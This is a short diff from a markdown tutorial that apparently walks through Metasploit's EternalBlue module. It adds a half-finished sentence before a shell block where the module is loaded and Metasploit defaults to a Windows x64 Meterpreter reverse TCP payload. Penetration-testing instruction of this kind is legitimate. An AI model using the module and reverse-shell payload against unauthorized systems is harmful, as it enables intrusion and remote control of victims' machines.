@@ -528,6 +528,8 @@ The `Rank` column estimates reliability. `average` on EternalBlue reflects a rea
 <br>
 </div>
 
+So here we want to Load the module and inspect required options. We've just identified the path and now we just want to see 
+
 ```shell
 msf > use 0
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
